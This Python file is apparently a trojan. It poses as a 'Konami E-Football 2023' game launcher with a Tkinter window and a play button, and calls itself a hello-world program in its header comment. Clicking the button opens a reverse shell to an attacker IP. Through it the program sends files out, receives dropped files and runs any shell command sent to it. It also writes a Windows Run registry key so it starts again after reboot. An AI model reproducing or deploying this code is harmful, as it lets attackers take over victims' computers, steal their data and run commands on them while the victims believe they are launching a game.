# Program to Say Hello World on clicking a button 

import tkinter as tk

# TCP Connection
import socket

# Process Handling
import subprocess

# OS essentials
import os

# Windows Registery Handling
import winreg as reg

import time


root= tk.Tk()

root.title("Konami E-Football 2023 - Paid Version")

canvas1 = tk.Canvas(root, width = 300, height = 300)
canvas1.pack()

# For Adding File To Windows Startup
def AddToStartup(f_name, path): 
      
    # Combine Path and Filename 
    address=os.path.join(path, f_name)  
      
    # Key To Change: HKEY_CURRENT_USER  
    # Key Value: Software\Microsoft\Windows\CurrentVersion\Run
    key = reg.HKEY_CURRENT_USER 
    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
      
    # Opening Key To Make Changes 
    open = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
    
    # Modifiy The Key 
    reg.SetValueEx(open, "any_name", 0, reg.REG_SZ, address) 
      
    # Closing 
    reg.CloseKey(open)

# def hello ():  
#     label1 = tk.Label(root, text= 'Loading,... Get ready to play in few minutes🤩', fg='green', font=('helvetica', 12, 'bold'))
#     canvas1.create_window(150, 200, window=label1)

# Connecting Target To Attacker
def connect():
    #Showing Button before proceeding
    # label1 = tk.Label(root, text= 'Loading,... Get ready to play in few minutes', fg='green', font=('helvetica', 12, 'bold'))
    # canvas1.create_window(150, 200, window=label1)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # # Put File In Startup
    # try:
    #     hello()

    # # If Failed, Send Exception Message To Attacker
    # except Exception as e:
    #     s.send(str(e).encode('utf-8'))

    # Try Until Not Connected
    connected = False
    while (connected == False):
        try:
            
            # Note: Please Place Attacker's IP Here
            s.connect(('192.168.0.86', 8080))

            # Connected
            connected = True

            # Sending Current Working Directory Of Target To Attacker
            cwd = os.getcwd()
            s.send(("dir:" + str(cwd)).encode('utf-8'))
            
        except:
            # If Failed To Connect, Print A Dot And Try Again
            print(".", end="")

    while True:
        try:
            # Recieve Command From Attacker
            command = s.recv(2048).strip().decode('utf-8')

            # Terminate Script
            if 'terminate' in command:
                s.close()
                break 

            # Grabbing Files
            # Example: grab picture.jpg
            elif command.startswith('grab'):

                # Extracting filename From Command
                # Skipping 1st Five Characters
                # Because They Are 'g', 'r', 'a', 'b', ' '
                file_name = command[5:]

                # Getting File Size
                file_size = os.path.getsize(file_name)

                # Sending File Name
                s.send(file_name.encode('utf-8'))

                # Recieving Response From Target
                # e.g., OK Response
                s.recv(1024).decode('utf-8')

                # Sending File Size
                s.send(str(file_size).encode('utf-8'))

                # Recieving Response
                s.recv(1024).decode('utf-8')

                # Opening File To Read
                # File Will Be Sent In Small Chunks Of Data
                with open(file_name, "rb") as file:

                    # Chunks Sent = 0
                    c = 0
                    
                    # Starting Time
                    start_time = time.time()

                    # Running Loop Until c < file_size
                    while c < file_size:

                        # Read 1024 Bytes
                        data = file.read(1024)

                        # If No Bytes, Stop
                        if not (data):
                            break

                        # Send Bytes
                        s.sendall(data)

                        # Chunks Sent += Length Of Data
                        c += len(data)

                    # Ending Time
                    end_time = time.time()

            # Transfer File From Attacker To Target
            # Example: video.mp4
            elif 'transfer' in command:

                # Recieving Name Of File To Be Transferred
                file_name = s.recv(1024).decode('utf-8')

                # Sending Response
                s.send('OK'.encode('utf-8'))

                # Recieving Size Of File To Be Transferred
                file_size = s.recv(1024).decode('utf-8')

                # Sending Response
                s.send('OK'.encode('utf-8'))

                # Opening File For Writing
                with open(file_name, "wb") as file:

                    # Chunks Recieved
                    c = 0
                    
                    # Starting Time
                    start_time = time.time()

                    # Running Until c < int(file_size)
                    while c < int(file_size):

                        # Recieve 1024 Bytes
                        data = s.recv(1024)

                        # If No Data, Stop
                        if not (data):
                            break

                        # Write Bytes To File
                        file.write(data)

                        # Chunks Added
                        c += len(data)

                    # Ending Time
                    end_time = time.time()

            # Changing Working Directory Of Target
            # Example: D:\
            elif command.startswith('cd '):

                # Extracting Directory
                # Skipping 3 Characters
                # They Are 'c', 'd', ' '
                dir = command[3:]

                # Change Directory
                try:
                    os.chdir(dir)

                except:
                    # If Failed, Revert
                    os.chdir(cwd)

                # Get Updated Working Directory
                cwd = os.getcwd()
                
                # Send Updated Directory To Attacker
                s.send(("dir:" + str(cwd)).encode('utf-8'))

            # Putting File In Startup Folder
            # Only Works For Windows
            # Example: starup T.py
            elif command.startswith('startup'):

                # Extracting Filename
                file_name = command[8:]

                # Extracting Path Of File
                # As File Is In Current Working Directory
                # Get Current Working Directory
                pth = os.getcwd()

                # Put File In Startup
                try:
                    AddToStartup(file_name, pth)

                    # Send OK To Attacker
                    s.send("OK".encode('utf-8'))

                # If Failed, Send Exception Message To Attacker
                except Exception as e:
                    s.send(str(e).encode('utf-8'))

            # Otherwise The Command Will Be Considered As CMD OR Terminal Command
            # Command Will Be Executed In Terminal
            else:
                # Executing Command
                CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

                # If Command Executes Succefully
                # Get Output Of Command
                out = CMD.stdout.read()

                # If Error Occured
                # Get Error Of Command
                err = CMD.stderr.read()

                # Send Output
                s.send(out)

                # Send Error
                s.send(err)

                # Some Commads Are Executed Successfully, But
                # They Don't Have Any Output
                # For Example: del file.ext
                # Above Command On Execution Doesn't Show Any Output
                # Put Our Attacker Is Alwayes Looking For Output
                # So, If There Is No Output And No Error
                # Send OK
                if (out == b'' and err == b''):
                    s.send("OK".encode('utf-8'))
                    
        # If Attacker Command Was Unable To Be Executed
        except Exception as e:

            # Send Exception Message To Attacker
            s.send(str(e).encode('utf-8'))


button1 = tk.Button(text='KONAMI 2023(Click To Play)',command=connect, bg='brown',fg='white')
canvas1.create_window(150, 150, window=button1)

label1 = tk.Label(root, text= 'Loading,... Game starts in few minutes🤩🤩🤩', fg='green', font=('helvetica', 9, 'bold'))
canvas1.create_window(150, 200, window=label1)

root.mainloop()


# Start Of Script
# If Connection Breaks
# Script Tries To Connect Again And Again
connected = False
while (not connected):
    try:
        connect()
        connected = True
    except:
        print(".", end = "")